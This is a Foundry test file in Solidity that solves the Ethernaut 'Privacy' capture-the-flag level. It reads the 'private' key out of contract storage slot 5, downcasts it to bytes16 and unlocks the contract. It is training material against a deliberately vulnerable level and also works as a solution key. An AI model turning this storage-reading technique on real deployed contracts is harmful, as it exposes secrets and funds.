// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// testing functionalities
import "forge-std/Test.sol";

// Ethernaut game components
import "src/levels/12-Privacy/PrivacyFactory.sol";
import "src/core/Ethernaut.sol";

//change this @todo
contract PrivacyTest is Test {
    /*//////////////////////////////////////////////////////////////
                            GAME INSTANCE SETUP
    //////////////////////////////////////////////////////////////*/

    Ethernaut ethernaut;

    address attacker = makeNameForAddress("attacker");

    function setUp() public {
        emit log_string("Setting up Privacy level...");
        ethernaut = new Ethernaut();
    }

    /*//////////////////////////////////////////////////////////////
                LEVEL INSTANCE -> EXPLOIT -> SUBMISSION
    //////////////////////////////////////////////////////////////*/

    function test_PrivacyExploit() public {
        /*//////////////////////////////////////////////////////////////
                            LEVEL INSTANCE SETUP
        //////////////////////////////////////////////////////////////*/

        PrivacyFactory privacyFactory = new PrivacyFactory();

        ethernaut.registerLevel(privacyFactory);
        vm.startPrank(attacker);

        address levelAddress = ethernaut.createLevelInstance(privacyFactory);
        Privacy privacyContract = Privacy(levelAddress);

        /*//////////////////////////////////////////////////////////////
                                LEVEL EXPLOIT
        //////////////////////////////////////////////////////////////*/

        console.log("Is Privacy contract locked?", privacyContract.locked());

        emit log_string("Starting the exploit...");
        emit log_string(
            "Attacker reads the data from the storage slot number 5..."
        );
        bytes32 key = vm.load(address(privacyContract), bytes32(uint256(5)));

        emit log_named_bytes32("Key is", key);

        emit log_named_bytes32("Downcasted data", bytes16(key));

        emit log_string(
            "Attacker calls the unlock function with the aquired data..."
        );

        privacyContract.unlock(bytes16(key));

        console.log("Is Privacy contract locked?", privacyContract.locked());

        // Test assertion
        assertEq(privacyContract.locked(), false);

        /*//////////////////////////////////////////////////////////////
                                LEVEL SUBMISSION
        //////////////////////////////////////////////////////////////*/

        bool challengeCompleted = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(challengeCompleted);
    }

    /*//////////////////////////////////////////////////////////////
                            HELPER FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    /**
     * I've found this useful function
     * in github/twpony Ethernaut repo
     * @notice This function allows for creating labels (names) for addresses
     * which will improve readability in traces
     * @param name you pass the name like "alice" or "bob" and it will create
     * an address for that person
     */
    function makeNameForAddress(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}
